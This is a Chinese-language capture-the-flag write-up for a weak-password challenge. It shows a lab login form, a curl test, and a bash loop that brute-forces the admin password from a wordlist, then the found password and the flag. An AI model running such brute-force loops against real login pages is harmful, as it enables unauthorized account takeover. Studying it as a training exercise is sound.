# 10-brute-weak-password 手工复刻

## 1. 打开页面看登录框

浏览器访问：

```text
http://127.0.0.1:33855/
```

页面是一个很简单的登录表单：

```html
<form method="post">
  Username: <input type="text" name="username" /><br />
  Password: <input type="password" name="password" /><br />
  <input type="submit" value="Login" />
</form>
```

所以可以确定：

- 请求方法：`POST`
- 请求地址：`/`
- 用户名字段：`username`
- 密码字段：`password`

## 2. 先随便测试一次错误密码

```bash
curl -i -s \
  -X POST 'http://47.120.76.57:33855/' \
  -d 'username=admin&password=123456'
```

错误时会返回：

```text
用户名或密码错误！
```

所以判断是否成功很简单：只要响应里不再出现 `用户名或密码错误！`，就可能是成功。

## 3. 用附件 password1.txt 手工爆破

题目目录下有附件：

```bash
ls
# password1.txt
```

因为常见后台用户一般是 `admin`，所以先固定用户名为 `admin`，逐行读取密码尝试：

```bash
while read p; do
  echo "try admin:$p"
  res=$(curl -s -X POST 'http://127.0.0.1:33855/' \
    -d "username=admin&password=$p")

  if ! echo "$res" | grep -q '用户名或密码错误'; then
    echo '[+] found password:' "$p"
    echo "$res"
    break
  fi
done < password1.txt
```

命中：

```text
username=admin
password=P5TEGw
```

成功响应直接返回 flag：

```text
TOGOGO-flag{4d33d037-7b12-4fd5-aecf-1d55f52e436b}
```

## 4. 单条 curl 复现

知道密码后，可以直接用一条命令复现：

```bash
curl -s -X POST 'http://47.120.76.57:33855/' \
  -d 'username=admin&password=P5TEGw'
```

输出：

```text
TOGOGO-flag{4d33d037-7b12-4fd5-aecf-1d55f52e436b}
```
